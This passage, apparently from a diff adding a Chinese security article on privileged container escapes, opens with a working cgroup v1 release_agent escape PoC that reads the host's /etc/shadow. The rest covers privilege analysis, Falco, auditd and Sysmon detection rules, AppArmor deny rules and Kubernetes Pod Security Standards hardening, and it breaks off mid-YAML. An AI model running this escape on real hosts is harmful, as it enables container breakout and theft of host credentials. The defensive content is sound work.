+<p>cgroup v1 的 <code>release_agent</code> 机制是经典的"合法机制逃逸"：当某个 cgroup 中最后一个进程退出时，内核会以 root 身份、在宿主机初始命名空间中执行该 cgroup 配置的 <code>release_agent</code> 脚本。这个机制完全不感知容器命名空间边界。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># === cgroup v1 release_agent 逃逸完整 PoC ===</span>
+<span class="c1"># 前提：容器拥有 CAP_SYS_ADMIN 且宿主机使用 cgroup v1（或 hybrid）</span>
+
+<span class="c1"># 1. 挂载 cgroup v1 的 memory 子系统（如未挂载）</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/cgrp
+mount<span class="w"> </span>-t<span class="w"> </span>cgroup<span class="w"> </span>-o<span class="w"> </span>memory<span class="w"> </span>cgroup<span class="w"> </span>/tmp/cgrp
+
+<span class="c1"># 2. 创建一个新的 cgroup 子目录（攻击者控制）</span>
+mkdir<span class="w"> </span>/tmp/cgrp/x
+
+<span class="c1"># 3. 启用 notify_on_release：当该 cgroup 最后一个进程退出时触发 release_agent</span>
+<span class="nb">echo</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/cgrp/x/notify_on_release
+
+<span class="c1"># 4. 获取容器在宿主机上的真实路径</span>
+<span class="c1"># 容器内 / 是 overlayfs，其 upperdir 在宿主机上的路径形如：</span>
+<span class="c1">#   /var/lib/docker/overlay2/&lt;hash&gt;/merged</span>
+<span class="nv">host_path</span><span class="o">=</span><span class="sb">`</span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;s/.*\upperdir=\([^,]*\).*/\1/p&#39;</span><span class="w"> </span>/etc/mtab<span class="sb">`</span>
+<span class="c1"># 拼接出 release_agent 脚本在宿主机上的路径</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$host_path</span><span class="s2">/cmd&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/cgrp/release_agent
+
+<span class="c1"># 5. 在容器内写入要执行的命令（会出现在宿主机文件系统上）</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/cmd<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">#!/bin/sh</span>
+<span class="s"># 此脚本将以宿主机 root 身份、在宿主机初始命名空间执行</span>
+<span class="s">cat /etc/shadow &gt; $host_path/output</span>
+<span class="s">whoami &gt;&gt; $host_path/output</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/cmd
+
+<span class="c1"># 6. 触发：在 cgroup x 中启动一个进程并立即退出</span>
+sh<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs &amp;&amp; exec sleep 1&quot;</span>
+
+<span class="c1"># 7. 读取结果（命令已在宿主机上以 root 执行）</span>
+cat<span class="w"> </span>/output
+<span class="c1"># root:$6$...:...    ← 宿主机 shadow 内容</span>
+<span class="c1"># root                ← 宿主机上的身份</span>
+</code></pre></div>
+
+<p><code>release_agent</code> 逃逸的精妙之处在于：它不修改任何内核代码，只是配置了一个内核本来就支持的"清理钩子"。内核在执行 <code>release_agent</code> 时，根本不检查调用者是否在容器中——这是 cgroup v1 的设计缺陷。CVE-2022-0492 正与此相关，它在非特权场景下也能利用，但特权容器中利用更加简单直接。</p>
+<hr />
+<h2>权限点分析</h2>
+<h3>攻击链中的关键权限提升点</h3>
+<p>整个攻击链的每一步都对应一个"权限检查点"。理解这些检查点，才能理解为什么特权容器如此危险——它一次性通过了所有检查。</p>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────────┐
+│                 攻击链权限检查点分解                                │
+│                                                                 │
+│  检查点                  普通容器    特权容器    绕过方式         │
+│  ─────────────────────   ────────    ────────    ─────────       │
+│  ① 设备 cgroup 限制      生效        解除        --privileged    │
+│  ② CAP_SYS_ADMIN         无          有          --privileged    │
+│  ③ CAP_SYS_MODULE        无          有          --privileged    │
+│  ④ CAP_SYS_PTRACE        无          有          --privileged    │
+│  ⑤ mount 系统调用过滤     seccomp拦截  放行        --privileged    │
+│  ⑥ AppArmor/SELinux      生效        解除        --privileged    │
+│  ⑦ docker.sock 可访问    否          取决于挂载  -v 挂载          │
+│  ⑧ cgroup release_agent  需SYS_ADMIN 需SYS_ADMIN --privileged    │
+│  ⑨ /proc/sys 内核参数    部分只读    部分可写    --privileged    │
+└─────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<p>关键权限提升点分析：</p>
+<ol>
+<li>
+<p><strong>设备 cgroup 解除（检查点①）</strong>：<code>--privileged</code> 自动执行 <code>--device-all</code>，将宿主机所有设备暴露给容器。这是后续 mount 块设备逃逸的前提。普通容器即使有 <code>CAP_SYS_ADMIN</code>，也无法访问 <code>/dev/sda</code>，因为设备 cgroup 会拒绝。</p>
+</li>
+<li>
+<p><strong>CAP_SYS_ADMIN 授予（检查点②）</strong>：这是 mount 操作的权限基础。没有它，<code>mount /dev/sda2</code> 会返回 <code>EPERM</code>。普通容器的 CapEff 掩码不含此位。</p>
+</li>
+<li>
+<p><strong>seccomp 放行（检查点⑤）</strong>：Docker 默认 seccomp profile 会阻止 <code>mount</code>、<code>keyctl</code>、<code>unshare</code> 等约 44 个系统调用。<code>--privileged</code> 会禁用 seccomp，使这些系统调用全部可用。这意味着即使去掉 <code>--privileged</code> 只保留 capabilities，seccomp 仍能阻止部分逃逸。</p>
+</li>
+<li>
+<p><strong>AppArmor/SELinux 解除（检查点⑥）</strong>：<code>--privileged</code> 同时禁用 AppArmor profile（默认的 <code>docker-default</code>）。这意味着即使有 capabilities，MAC（强制访问控制）也不再提供纵深防御。</p>
+</li>
+</ol>
+<h3>最小权限原则分析</h3>
+<p>特权容器之所以危险，本质上是对最小权限原则的全面违背。按照最小权限原则，一个容器只需要完成其业务功能所必需的最小 capability 集合。例如：</p>
+<table>
+<thead>
+<tr>
+<th>业务场景</th>
+<th>所需 capability</th>
+<th>错误做法</th>
+<th>正确做法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>绑定 80 端口</td>
+<td>CAP_NET_BIND_SERVICE</td>
+<td><code>--privileged</code></td>
+<td><code>--cap-add NET_BIND_SERVICE</code></td>
+</tr>
+<tr>
+<td>修改网络路由</td>
+<td>CAP_NET_ADMIN</td>
+<td><code>--privileged</code></td>
+<td><code>--cap-add NET_ADMIN</code></td>
+</tr>
+<tr>
+<td>采集系统性能</td>
+<td>无（用 eBPF/procfs）</td>
+<td><code>--privileged</code></td>
+<td>只读挂载 <code>/proc</code></td>
+</tr>
+<tr>
+<td>需要 Docker API</td>
+<td>无</td>
+<td>挂载 docker.sock</td>
+<td>使用 Docker TCP+TLS 限定权限</td>
+</tr>
+</tbody>
+</table>
+<p>最小权限分析的核心结论：<strong>绝大多数使用 <code>--privileged</code> 的场景，其实只需要 0-2 个 capability</strong>。Docker Socket 逃逸和 cgroup 逃逸在仅有特定 capability 时仍可能发生，但块设备挂载、内核模块加载等高危路径在移除 <code>CAP_SYS_ADMIN</code>/<code>CAP_SYS_MODULE</code> 后会被完全阻断。</p>
+<hr />
+<h2>检测方案</h2>
+<h3>Falco / eBPF 检测规则</h3>
+<p>Falco 是 CNCF 的容器运行时安全检测工具，基于内核模块或 eBPF 探针实时监控系统调用。以下规则可检测本文涉及的各逃逸路径。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># falco_rules_local.yaml — 特权容器逃逸检测规则</span>
+
+<span class="c1"># 规则1：容器内挂载宿主机块设备</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Mount Host Filesystem from Container</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器内执行 mount 挂载块设备（逃逸信号）</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">evt.type=mount and container and</span>
+<span class="w">    </span><span class="no">(fd.name startswith /dev/sd or fd.name startswith /dev/nvme or</span>
+<span class="w">     </span><span class="no">fd.name startswith /dev/vd)</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Privileged container escape attempt — mount host device</span>
+<span class="w">    </span><span class="no">(user=%user.name container=%container.name image=%container.image.repository</span>
+<span class="w">     </span><span class="no">device=%fd.name cmd=%proc.cmdline)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container_escape</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">privileged</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">mitre_privilege_escalation</span><span class="p p-Indicator">]</span>
+
+<span class="c1"># 规则2：容器内加载内核模块</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Load Kernel Module from Container</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器内执行 insmod/modprobe（CAP_SYS_MODULE 滥用）</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">spawned_process and container and</span>
+<span class="w">    </span><span class="no">(proc.name in (insmod, modprobe) or</span>
+<span class="w">     </span><span class="no">(evt.type=init_module and proc.name!=&quot;kmod&quot;))</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Kernel module loaded from container — possible escape</span>
+<span class="w">    </span><span class="no">(user=%user.name container=%container.name</span>
+<span class="w">     </span><span class="no">image=%container.image.repository cmd=%proc.cmdline)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container_escape</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">kernel_module</span><span class="p p-Indicator">]</span>
+
+<span class="c1"># 规则3：容器内访问 Docker Socket</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Docker Socket Access from Container</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器内进程访问 docker.sock</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">open_read_write and container and</span>
+<span class="w">    </span><span class="no">fd.name=/var/run/docker.sock</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Container accessing Docker socket — possible escape</span>
+<span class="w">    </span><span class="no">(user=%user.name container=%container.name</span>
+<span class="w">     </span><span class="no">image=%container.image.repository proc=%proc.name)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WARNING</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container_escape</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">docker_socket</span><span class="p p-Indicator">]</span>
+
+<span class="c1"># 规则4：cgroup release_agent 写入</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Write Cgroup Release Agent</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测写入 release_agent 文件（cgroup 逃逸信号）</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">open_write and container and</span>
+<span class="w">    </span><span class="no">fd.name contains &quot;release_agent&quot;</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Cgroup release_agent modified — possible escape</span>
+<span class="w">    </span><span class="no">(user=%user.name container=%container.name</span>
+<span class="w">     </span><span class="no">file=%fd.name cmd=%proc.cmdline)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CRITICAL</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container_escape</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">cgroup</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">CVE-2022-0492</span><span class="p p-Indicator">]</span>
+
+<span class="c1"># 规则5：特权容器启动（基线告警）</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Launch Privileged Container</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测启动特权容器</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">container and container.privileged=true and evt.type=container</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Privileged container launched</span>
+<span class="w">    </span><span class="no">(container=%container.name image=%container.image.repository</span>
+<span class="w">     </span><span class="no">user=%user.name)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WARNING</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">privileged_container</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">baseline</span><span class="p p-Indicator">]</span>
+
+<span class="c1"># 规则6：容器内 chroot 到挂载点</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Chroot to Mounted Host FS</span>
+<span class="w">  </span><span class="nt">desc</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">检测容器内 chroot（逃逸后落地动作）</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">spawned_process and container and proc.name=chroot</span>
+<span class="w">  </span><span class="nt">output</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">Chroot executed in container — possible post-escape action</span>
+<span class="w">    </span><span class="no">(user=%user.name container=%container.name cmd=%proc.cmdline)</span>
+<span class="w">  </span><span class="nt">priority</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">WARNING</span>
+<span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">container_escape</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">chroot</span><span class="p p-Indicator">]</span>
+</code></pre></div>
+
+<h3>Docker audit 日志</h3>
+<p>通过 Linux auditd 审计 Docker daemon 的关键操作，可记录所有通过 Docker API 创建特权容器的行为：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># /etc/audit/rules.d/docker.rules — Docker 审计规则</span>
+
+<span class="c1"># 审计 Docker daemon 配置变更</span>
+-w<span class="w"> </span>/usr/bin/dockerd<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>docker_daemon
+-w<span class="w"> </span>/etc/docker/<span class="w"> </span>-p<span class="w"> </span>wa<span class="w"> </span>-k<span class="w"> </span>docker_config
+
+<span class="c1"># 审计 docker.sock 的访问</span>
+-w<span class="w"> </span>/var/run/docker.sock<span class="w"> </span>-p<span class="w"> </span>rwxa<span class="w"> </span>-k<span class="w"> </span>docker_socket_access
+
+<span class="c1"># 审计容器运行时关键系统调用</span>
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b64<span class="w"> </span>-S<span class="w"> </span>mount<span class="w"> </span>-F<span class="w"> </span>auid&gt;<span class="o">=</span><span class="m">1000</span><span class="w"> </span>-k<span class="w"> </span>container_mount
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b64<span class="w"> </span>-S<span class="w"> </span>init_module<span class="w"> </span>-F<span class="w"> </span>auid&gt;<span class="o">=</span><span class="m">1000</span><span class="w"> </span>-k<span class="w"> </span>kernel_module_load
+-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b64<span class="w"> </span>-S<span class="w"> </span>delete_module<span class="w"> </span>-F<span class="w"> </span>auid&gt;<span class="o">=</span><span class="m">1000</span><span class="w"> </span>-k<span class="w"> </span>kernel_module_unload
+
+<span class="c1"># 重载审计规则</span>
+augenrules<span class="w"> </span>--load
+
+<span class="c1"># 查询逃逸相关审计事件</span>
+ausearch<span class="w"> </span>-k<span class="w"> </span>docker_socket_access<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-20
+ausearch<span class="w"> </span>-k<span class="w"> </span>kernel_module_load<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-20
+</code></pre></div>
+
+<h3>Sysmon 容器事件</h3>
+<p>Sysmon for Linux 可记录进程创建、网络连接等事件，用于容器逃逸的取证分析：</p>
+<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- sysmon_config.xml — 容器逃逸检测配置 --&gt;</span>
+<span class="nt">&lt;Sysmon</span><span class="w"> </span><span class="na">schemaversion=</span><span class="s">&quot;4.93&quot;</span><span class="nt">&gt;</span>
+<span class="w">  </span><span class="nt">&lt;EventFiltering&gt;</span>
+<span class="w">    </span><span class="cm">&lt;!-- 记录容器内 mount 调用 --&gt;</span>
+<span class="w">    </span><span class="nt">&lt;RuleGroup</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;Container Escape&quot;</span><span class="w"> </span><span class="na">groupRelation=</span><span class="s">&quot;or&quot;</span><span class="nt">&gt;</span>
+<span class="w">      </span><span class="nt">&lt;ProcessCreate</span><span class="w"> </span><span class="na">onmatch=</span><span class="s">&quot;include&quot;</span><span class="nt">&gt;</span>
+<span class="w">        </span><span class="cm">&lt;!-- 捕获容器内的 mount/chroot/insmod --&gt;</span>
+<span class="w">        </span><span class="nt">&lt;CommandLine</span><span class="w"> </span><span class="na">condition=</span><span class="s">&quot;contains&quot;</span><span class="nt">&gt;</span>mount<span class="w"> </span>/dev/sd<span class="nt">&lt;/CommandLine&gt;</span>
+<span class="w">        </span><span class="nt">&lt;CommandLine</span><span class="w"> </span><span class="na">condition=</span><span class="s">&quot;contains&quot;</span><span class="nt">&gt;</span>chroot<span class="w"> </span>/mnt/host<span class="nt">&lt;/CommandLine&gt;</span>
+<span class="w">        </span><span class="nt">&lt;CommandLine</span><span class="w"> </span><span class="na">condition=</span><span class="s">&quot;is&quot;</span><span class="nt">&gt;</span>insmod<span class="nt">&lt;/CommandLine&gt;</span>
+<span class="w">        </span><span class="nt">&lt;CommandLine</span><span class="w"> </span><span class="na">condition=</span><span class="s">&quot;contains&quot;</span><span class="nt">&gt;</span>release_agent<span class="nt">&lt;/CommandLine&gt;</span>
+<span class="w">        </span><span class="cm">&lt;!-- 捕获 docker.sock 的 curl 访问 --&gt;</span>
+<span class="w">        </span><span class="nt">&lt;CommandLine</span><span class="w"> </span><span class="na">condition=</span><span class="s">&quot;contains&quot;</span><span class="nt">&gt;</span>--unix-socket<span class="w"> </span>/var/run/docker.sock<span class="nt">&lt;/CommandLine&gt;</span>
+<span class="w">      </span><span class="nt">&lt;/ProcessCreate&gt;</span>
+<span class="w">      </span><span class="cm">&lt;!-- 记录对块设备的访问 --&gt;</span>
+<span class="w">      </span><span class="nt">&lt;FileCreate</span><span class="w"> </span><span class="na">onmatch=</span><span class="s">&quot;include&quot;</span><span class="nt">&gt;</span>
+<span class="w">        </span><span class="nt">&lt;TargetFilename</span><span class="w"> </span><span class="na">condition=</span><span class="s">&quot;begin with&quot;</span><span class="nt">&gt;</span>/dev/sd<span class="nt">&lt;/TargetFilename&gt;</span>
+<span class="w">        </span><span class="nt">&lt;TargetFilename</span><span class="w"> </span><span class="na">condition=</span><span class="s">&quot;begin with&quot;</span><span class="nt">&gt;</span>/dev/nvme<span class="nt">&lt;/TargetFilename&gt;</span>
+<span class="w">      </span><span class="nt">&lt;/FileCreate&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/RuleGroup&gt;</span>
+<span class="w">  </span><span class="nt">&lt;/EventFiltering&gt;</span>
+<span class="nt">&lt;/Sysmon&gt;</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1"># 安装并加载 Sysmon 配置</span>
+sysmon<span class="w"> </span>-accepteula<span class="w"> </span>-i<span class="w"> </span>sysmon_config.xml
+
+<span class="c1"># 查询 Sysmon 日志（逃逸事件）</span>
+sysmon<span class="w"> </span>-d<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;mount|chroot|insmod|docker.sock&#39;</span>
+</code></pre></div>
+
+<hr />
+<h2>加固方案</h2>
+<h3>Docker 安全配置</h3>
+<h4>禁用 --privileged 标志</h4>
+<p>最有效的加固是彻底禁用 <code>--privileged</code>。Docker 本身没有"禁止特权"的开关，但可通过以下方式约束：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 方法1：通过 AppArmor 限制（推荐）</span>
+<span class="c1"># 创建 AppArmor profile 禁止特权操作</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/etc/apparmor.d/docker-no-privileged<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">#include &lt;tunables/global&gt;</span>
+<span class="s">profile docker-no-privileged flags=(attach_disconnected) {</span>
+<span class="s">  #include &lt;abstractions/base&gt;</span>
+<span class="s">  # 禁止 mount 系统调用</span>
+<span class="s">  deny mount,</span>
+<span class="s">  # 禁止加载内核模块</span>
+<span class="s">  deny /lib/modules/** wklx,</span>
+<span class="s">  # 禁止访问块设备</span>
+<span class="s">  deny /dev/sd* wklx,</span>
+<span class="s">  deny /dev/nvme* wklx,</span>
+<span class="s">  # 禁止访问 docker.sock</span>
+<span class="s">  deny /var/run/docker.sock rw,</span>
+<span class="s">  # 禁止写入 release_agent</span>
+<span class="s">  deny /**/release_agent w,</span>
+<span class="s">}</span>
+<span class="s">EOF</span>
+apparmor_parser<span class="w"> </span>-r<span class="w"> </span>/etc/apparmor.d/docker-no-privileged
+
+<span class="c1"># 启动容器时应用该 profile</span>
+docker<span class="w"> </span>run<span class="w"> </span>--security-opt<span class="w"> </span><span class="nv">apparmor</span><span class="o">=</span>docker-no-privileged<span class="w"> </span>...
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1"># 方法2：通过 OPA/Gatekeeper 在 K8s 层禁止（见下文 PSS）</span>
+<span class="c1"># 方法3：通过企业内部 CI/CD 流水线扫描 Dockerfile/docker-compose</span>
+<span class="c1"># 检测 --privileged 关键字</span>
+</code></pre></div>
+
+<h4>最小 capabilities 配置</h4>
+<p>用 <code>--cap-drop</code> 移除所有 capability，再用 <code>--cap-add</code> 按需添加：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 最佳实践：先 drop ALL，再按需 add</span>
+docker<span class="w"> </span>run<span class="w"> </span>-dit<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--cap-drop<span class="w"> </span>ALL<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--cap-add<span class="w"> </span>NET_BIND_SERVICE<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--security-opt<span class="w"> </span>no-new-privileges<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>ubuntu:22.04
+
+<span class="c1"># 验证 capability 是否已最小化</span>
+docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>&lt;container&gt;<span class="w"> </span>cat<span class="w"> </span>/proc/self/status<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>CapEff
+<span class="c1"># CapEff: 0000000000000400  ← 仅 NET_BIND_SERVICE</span>
+</code></pre></div>
+
+<h4>用户命名空间隔离</h4>
+<p>用户命名空间映射（user namespace remapping）使容器内 root 映射为宿主机上的非特权用户，即便逃逸也只是非特权用户：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># /etc/docker/daemon.json — 启用 user namespace remapping</span>
+<span class="o">{</span>
+<span class="w">  </span><span class="s2">&quot;userns-remap&quot;</span>:<span class="w"> </span><span class="s2">&quot;default&quot;</span>
+<span class="o">}</span>
+
+<span class="c1"># 重启 Docker</span>
+systemctl<span class="w"> </span>restart<span class="w"> </span>docker
+
+<span class="c1"># 此后容器内 root (uid=0) 在宿主机上映射为 dockremap 用户（如 uid=100000）</span>
+<span class="c1"># 即使逃逸到宿主机，也只是一个无权限的普通用户</span>
+</code></pre></div>
+
+<h3>Kubernetes Pod Security Standards</h3>
+<p>Kubernetes Pod Security Standards（PSS）从 1.25 起替代了已废弃的 PodSecurityPolicy，提供三个级别的安全基线。可通过 Pod Security Admission 强制执行。</p>
+<h4>Baseline 策略</h4>
+<p>Baseline 禁止已知提权风险最高的配置，适用于所有 Pod：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># namespace 级别强制 Baseline</span>
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Namespace</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">production</span>
+<span class="w">  </span><span class="nt">labels</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">pod-security.kubernetes.io/enforce</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">baseline</span>
+<span class="w">    </span><span class="nt">pod-security.kubernetes.io/enforce-version</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">latest</span>
+<span class="w">    </span><span class="nt">pod-security.kubernetes.io/warn</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">baseline</span>
+<span class="nn">---</span>
+<span class="c1"># Baseline 禁止的配置（以下 Pod 会被拒绝）</span>
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Pod</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">bad-pod</span>
+<span class="nt">spec</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">hostPID</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span><span class="w">               </span><span class="c1"># Baseline 禁止</span>
+<span class="w">  </span><span class="nt">hostNetwork</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span><span class="w">           </span><span class="c1"># Baseline 禁止</span>
+<span class="w">  </span><span class="nt">containers</span><span class="p">:</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">app</span>
+<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">app:v1</span>
+<span class="w">    </span><span class="nt">securityContext</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span><span class="w">        </span><span class="c1"># Baseline 禁止 ← 关键</span>
+<span class="w">      </span><span class="nt">capabilities</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">add</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;SYS_ADMIN&quot;</span><span class="p p-Indicator">]</span><span class="w">    </span><span class="c1"># Baseline 禁止危险 capability</span>
+</code></pre></div>
+
+<h4>Restricted 策略</h4>
+<p>Restricted 是最严格的级别，要求容器以非 root 运行、移除所有 capability 并启用 seccomp，适用于生产环境：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Namespace</span>
+<span class="nt">metadata</span><span class="p">:</span>
